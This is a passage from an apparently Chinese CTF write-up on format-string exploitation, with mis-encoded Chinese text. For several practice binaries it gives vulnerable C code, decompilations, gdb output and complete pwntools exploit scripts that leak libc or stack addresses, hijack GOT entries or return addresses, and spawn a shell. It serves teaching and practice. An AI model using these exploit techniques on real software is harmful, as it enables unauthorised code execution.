class="hljs-params">()</span> </span>&#123;setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, _IONBF, <span class="hljs-number">0</span>);alarm(<span class="hljs-number">180</span>);<span class="hljs-keyword">char</span> str[<span class="hljs-number">100</span>];<span class="hljs-keyword">while</span>(gets(str)) &#123;<span class="hljs-built_in">printf</span>(str);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>éœ€è¦ç¼–è¯‘ä¸º64ä½ï¼Œè¿™ä¸ªé¢˜æ¯”èµ·æ¥ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯æ²¡æœ‰äº†systemå‡½æ•°ï¼Œéœ€è¦è‡ªå·±æ³„æ¼ä¸€ä¸‹libcçš„baseï¼Œç®—å‡ºsystemåœ°å€ï¼Œç„¶åè¿˜æ˜¯GOT hijackå°±å¯ä»¥äº†ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./fmt1'</span>)elf = ELF(<span class="hljs-string">'./fmt1'</span>)libc = elf.libcprintf_got = <span class="hljs-number">0x0000601020</span>io.sendline(<span class="hljs-string">'%21$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)libc_base = int((io.recv(<span class="hljs-number">12</span>)),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span> -libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]print(<span class="hljs-string">'leak_libc_base: '</span> + hex(libc_base))print(<span class="hljs-string">'system_addr: '</span> + hex(system_addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = system_addr<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">12</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) + p64(printf_got) +p64(printf_got+<span class="hljs-number">2</span>) + p64(printf_got+<span class="hljs-number">4</span>)io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-keyword">int</span> magic = <span class="hljs-number">0</span> ;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please crax me !"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me magic :"</span>);read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(buf);<span class="hljs-keyword">if</span>(magic == <span class="hljs-number">0xda</span>)&#123;system(<span class="hljs-string">"cat /home/craxme/flag"</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(magic == <span class="hljs-number">0xfaceb00c</span>)&#123;system(<span class="hljs-string">"cat /home/craxme/craxflag"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">"You need be a phd"</span>);&#125;&#125;</code></pre></div><p>ç¼–è¯‘ä¸º64ä½ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ï¼ˆè¿™ä¸ªé¢˜ç›®æ˜¯çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ ä»»æ„åœ°å€å†™å…¥çš„ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥å†™expæ‹¿sheeläº†ã€‚ï¼‰å¯ä»¥çœ‹åˆ°å½“å†ä¸€æ¬¡printfï¼Œä¹‹åç¨‹åºä¾¿åœæ­¢äº†ï¼Œä¸”ç»“æŸå‰æœ‰putså‡½æ•°ã€‚<br>æ€è·¯å°±æ˜¯å¯ä»¥GOT hijack putå‡½æ•°çš„GOTä¸ºreadå‡½æ•°å“ªé‡Œï¼Œè®©å…¶call putså‡½æ•°æ—¶è¿”å›åˆ°readå‡½æ•°ï¼Œå¹¶ä¸”åœ¨è¿™æ¬¡printfå‡½æ•°æ¼æ´åˆ©ç”¨æ—¶ï¼Œä¹ŸæŠŠprintfå‡½æ•°çš„GOTæ”¹ä¸ºsystemçš„pltï¼Œç„¶åä¼ å…¥<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./craxme'</span>)<span class="hljs-comment"># io = remote('127.0.0.1',8888)</span>magic = <span class="hljs-number">0x0000060106C</span>io.recvuntil(<span class="hljs-string">':'</span>)system_plt = <span class="hljs-number">0x04005A0</span>puts_got = <span class="hljs-number">0x0601018</span>ret_addr = <span class="hljs-number">0x00400747</span>printf_got = <span class="hljs-number">0x00601030</span>key = <span class="hljs-number">0x00400747</span>key2 = <span class="hljs-number">0x04005A0</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">26</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">29</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x80</span>+<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + flat([puts_got,puts_got+<span class="hljs-number">2</span>,puts_got+<span class="hljs-number">4</span>,printf_got,printf_got+<span class="hljs-number">2</span>,printf_got+<span class="hljs-number">4</span>])io.sendline(payload)io.interactive()</code></pre></div><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3'</span>    Arch:     i386<span class="hljs-number">-32</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)</code></pre></div><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜æ¨¡æ‹Ÿäº†ä¸€ä¸ªftpæœåŠ¡ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œæ§åˆ¶çš„æ˜¯ç™»é™†ã€‚è¿›å…¥åˆ†æä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">ask_username</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *dest)</span></span>&#123;  <span class="hljs-keyword">char</span> src[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-34h]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Connected to ftp.hacker.server"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"220 Serv-U FTP Server v6.4 for WinSock ready..."</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name (ftp.hacker.server:Rainism):"</span>);  __isoc99_scanf(<span class="hljs-string">"%40s"</span>, src);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">39</span> &amp;&amp; src[i]; ++i )    ++src[i];  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(dest, src);&#125;</code></pre></div><p>ç”¨æˆ·åå‡½æ•°ï¼Œå‘ç°å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¯¸ä½çš„è¿›è¡ŒåŠ ä¸€ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">ask_password</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">"sysbdmin"</span>) )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"welcome!"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"who you are?"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"welcome!"</span>);&#125;</code></pre></div><p>ç”¨æˆ·å¯†ç å‡½æ•°ï¼Œå‘ç°è¦è·Ÿ<code>sysbdmin</code> è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œå°±ç›´æ¥é€€å‡ºã€‚<br>(strcmpå‡½æ•°å¯¹æ¯”ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç›¸ç­‰è¿”å›0ï¼Œ!0 = éå‡ = çœŸï¼‰<br>æ‰€ä»¥è¿™ä¸ªç»•è¿‡å°±æ—¶sysbdmin è¯¸ä½å‡1å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>å‰©ä¸‹çš„å°±æ˜¯è¾“å…¥<code>get put dir</code>,ä¼šè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œå…¶ä¸­è¾“å…¥getå‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_file</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+1Ch] [ebp-FCh]</span>  <span class="hljs-keyword">char</span> s1; <span class="hljs-comment">// [esp+E4h] [ebp-34h]</span>  <span class="hljs-keyword">char</span> *i; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"enter the file name you want to get:"</span>);  __isoc99_scanf(<span class="hljs-string">"%40s"</span>, &amp;s1);  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;s1, <span class="hljs-string">"flag"</span>, <span class="hljs-number">4u</span>) )    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"too young, too simple"</span>);  <span class="hljs-keyword">for</span> ( i = (<span class="hljs-keyword">char</span> *)file_head; i; i = (<span class="hljs-keyword">char</span> *)*((_DWORD *)i + <span class="hljs-number">60</span>) )  &#123;    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(i, &amp;s1) )    &#123;      <span class="hljs-built_in">strcpy</span>(&amp;dest, i + <span class="hljs-number">40</span>);      <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;dest);    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;dest);&#125;</code></pre></div><p>è¿™ä¸ªå‡½æ•°æ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œå½“ä½ putä¸Šå»ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒä¼šè®©ä½ è¾“å…¥æ–‡ä»¶åå­—å’Œæ–‡ä»¶å†…å®¹ï¼Œç„¶ågetè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®æ–‡ä»¶åå­—ï¼Œæ¥è¾“å‡ºå…¶å†…å®¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä¸€ä¸‹å°±å¯ä»¥å®ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨äº†ã€‚å¹¶ä¸”åœ¨dirä¸­ï¼Œå…¶ä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„åå­—ï¼Œç”¨çš„æ˜¯putså‡½æ•°ã€‚ç„¶åå°±æœ‰æ€è·¯åˆ©ç”¨äº†ï¼š</p><ul><li>ç”±äºæ²¡æœ‰systemå‡½æ•°ï¼Œç„¶åå°±éœ€è¦æƒ³åŠæ³•æ³„æ¼ä¸€ä¸‹libcåœ°å€ï¼Œæ¥ç®—å‡ºsystemçš„å‡½æ•°åœ¨libcçš„åœ°å€ã€‚</li><li>ä¿®æ”¹putså‡½æ•°çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶åè®°å¾—è¿™ä¸ªæ–‡ä»¶çš„åç§°æ˜¯<code>/bin/sh</code>,è¿™æ ·åœ¨ä½¿ç”¨dirè°ƒç”¨putså‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚<br>è¿™é¢˜æ¯”è¾ƒæœ‰è¶£ï¼Œæœ‰ç‚¹éš¾åœ¨åˆ†æè¿™ä¸ªç¨‹åºåœ¨å¹²å˜›ï¼Œåˆ©ç”¨æ€è·¯å€’æ˜¯ä¸éš¾ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./pwn3'</span>)elf = ELF(<span class="hljs-string">'./pwn3'</span>)libc = elf.libcs = <span class="hljs-string">'sysbdmin'</span>key = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:    key+=chr(ord(i)<span class="hljs-number">-1</span>)print(key)io.sendline(key)info(<span class="hljs-string">'---------leak libc_base--------'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'put'</span>)io.recvuntil(<span class="hljs-string">'upload:'</span>)io.sendline(<span class="hljs-string">'1111'</span>)puts_got = elf.got[<span class="hljs-string">'puts'</span>]io.sendline(<span class="hljs-string">'%8$s'</span> + p32(puts_got) )io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'get'</span>)io.recvuntil(<span class="hljs-string">'get:'</span>)io.sendline(<span class="hljs-string">'1111'</span>)puts_addr = u32(io.recv(<span class="hljs-number">4</span>)[:<span class="hljs-number">4</span>])print(<span class="hljs-string">'puts_add:'</span> + hex(puts_addr))sys_addr = puts_addr - libc.symbols[<span class="hljs-string">'puts'</span>] + libc.symbols[<span class="hljs-string">'system'</span>]io.recvuntil(<span class="hljs-string">'&gt;'</span>)info(<span class="hljs-string">'---------hijack puts_got--------'</span>)io.sendline(<span class="hljs-string">'put'</span>)io.recvuntil(<span class="hljs-string">'upload:'</span>)io.sendline(<span class="hljs-string">'/bin/sh;'</span>)payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;puts_got: sys_addr&#125;)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'get'</span>)io.recvuntil(<span class="hljs-string">'get:'</span>)info(<span class="hljs-string">'--------- get shell-------'</span>)io.sendline(<span class="hljs-string">'/bin/sh;'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'dir'</span>)io.interactive()</code></pre></div><h2 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme_k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme_k0</h2><h3 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotäº†ã€‚</p><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_400B07</span><span class="hljs-params">(<span class="hljs-keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="hljs-keyword">char</span> formata, __int64 a8, __int64 a9)</span></span>&#123;  write(<span class="hljs-number">0</span>, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>, <span class="hljs-number">0x1A</span>uLL);  <span class="hljs-built_in">printf</span>(&amp;formata, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;a9 + <span class="hljs-number">4</span>);&#125;</code></pre></div><p>å…¶ä¸­å‘ç°å…¶è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>å¹¶ä¸”è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œå°±å¯ä»¥å»ä¿®æ”¹ç¨‹åºçš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚<br>Gdbè°ƒè¯•å®šä½å…³é”®åœ¨è¿™ä¸ªprintfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œrdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚å¹¶ä¸”å‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œè¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºret addressï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./pwnme_k0'</span>)<span class="hljs-comment"># context.clear(arch = 'amd64')</span>io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'%0006$lx'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'11111111'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)<span class="hljs-comment"># io.recvuntil('Welc0me to sangebaimao!\n')</span>stack = int(io.recvline_contains(<span class="hljs-string">'7f'</span>),<span class="hljs-number">16</span>)print(stack)ret_add = stack - <span class="hljs-number">0x38</span><span class="hljs-comment"># system_add = 0x04008AA</span>payload = <span class="hljs-string">'%2218c%8$hn'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'2'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(p64(ret_add))io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.interactive()</code></pre></div><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/buuctf/inndy_echo2/echo2'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre></div><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†pieï¼Œè¿™æ—¶å€™å°±éœ€è¦æ¥æ³„æ¼ä¸€ä¸‹pieçš„åŸºåœ°å€ã€‚</p><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">echo</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-110h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+108h] [rbp-8h]</span>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s, <span class="hljs-number">256L</span>L);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>ä»£ç æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿˜æ˜¯got hijack å°±è¡Œäº†ã€‚éš¾ç‚¹ä¹Ÿæ˜¯å¦‚ä½•æ¥å¤„ç†è¿™ä¸ªpieä¿æŠ¤ã€‚</p><h3 id="gdb-è°ƒè¯•"><a href="#gdb-è°ƒè¯•" class="headerlink" title="gdb è°ƒè¯•"></a>gdb è°ƒè¯•</h3><div class="hljs"><pre><code class="hljs c">=&gt; <span class="hljs-number">0x555555554984</span> &lt;echo+<span class="hljs-number">68</span>&gt;:call   <span class="hljs-number">0x5555555547a0</span> &lt;<span class="hljs-built_in">printf</span>@plt&gt;   <span class="hljs-number">0x555555554989</span> &lt;echo+<span class="hljs-number">73</span>&gt;:lea    rax,[rbp<span class="hljs-number">-0x110</span>]   <span class="hljs-number">0x555555554990</span> &lt;echo+<span class="hljs-number">80</span>&gt;:lea    rsi,[rip+<span class="hljs-number">0xfd</span>]        # <span class="hljs-number">0x555555554a94</span>   <span class="hljs-number">0x555555554997</span> &lt;echo+<span class="hljs-number">87</span>&gt;:mov    rdi,rax   <span class="hljs-number">0x55555555499a</span> &lt;echo+<span class="hljs-number">90</span>&gt;:call   <span class="hljs-number">0x5555555547d0</span> &lt;<span class="hljs-built_in">strcmp</span>@plt&gt;</code></pre></div><p>æ‰¾åˆ°å…³é”®ç‚¹ï¼Œç„¶åçœ‹ä¸€ä¸‹æ ˆæƒ…å†µï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-number">0192</span>| <span class="hljs-number">0x7fffffffe1c0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span class="hljs-number">0xfbad2087</span>--More--(<span class="hljs-number">25</span>/<span class="hljs-number">48</span>)<span class="hljs-number">0200</span>| <span class="hljs-number">0x7fffffffe1c8</span> --&gt; <span class="hljs-number">0x7ffff7a88947</span> (&lt;_IO_default_setbuf+<span class="hljs-number">23</span>&gt;:cmp    eax,<span class="hljs-number">0xffffffff</span>)<span class="hljs-number">0208</span>| <span class="hljs-number">0x7fffffffe1d0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span class="hljs-number">0xfbad2087</span><span class="hljs-number">0216</span>| <span class="hljs-number">0x7fffffffe1d8</span> --&gt; <span class="hljs-number">0x7ffff7fd8700</span> (<span class="hljs-number">0x00007ffff7fd8700</span>)<span class="hljs-number">0224</span>| <span class="hljs-number">0x7fffffffe1e0</span> --&gt; <span class="hljs-number">0x555555554810</span> (&lt;_start&gt;:xor    ebp,ebp)<span class="hljs-number">0232</span>| <span class="hljs-number">0x7fffffffe1e8</span> --&gt; <span class="hljs-number">0x7ffff7a85439</span> (&lt;_IO_new_file_setbuf+<span class="hljs-number">9</span>&gt;:test   rax,rax)<span class="hljs-number">0240</span>| <span class="hljs-number">0x7fffffffe1f0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span 